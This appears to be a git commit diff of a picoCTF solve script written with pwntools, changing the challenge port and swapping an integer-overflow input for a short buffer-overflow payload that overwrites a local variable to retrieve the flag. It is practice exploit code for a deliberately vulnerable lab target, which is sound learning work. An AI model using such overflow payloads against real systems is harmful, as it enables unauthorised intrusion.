c6ec18a90793a4896d9c5f884ba6f2db7a1cf0b6
IloveNooodles <mgarebaldhie80@gmail.com>
2023-05-13 00:14:02 +0700

    feat(pico): picker

--- picoCTF/local_target/solve.py
+++ picoCTF/local_target/solve.py
@@ -1,16 +1,12 @@
 from pwn import *
 
-conn = "nc saturn.picoctf.net 58819"
+conn = "nc saturn.picoctf.net 58921"
 host = conn.split(" ")[1]
 port = conn.split(" ")[2]
 
 p = remote(host, port)
 
-num = 2**31 - 1
-text = f"{num}"
-
-p.sendline(text.encode())
-p.sendline(text.encode())
+p.sendline(b"aaaabbbbccccddddeeeeffffA")
 f = p.recvall()
 flag = f.decode().split("picoCTF")
 print("picoCTF" + flag[1])
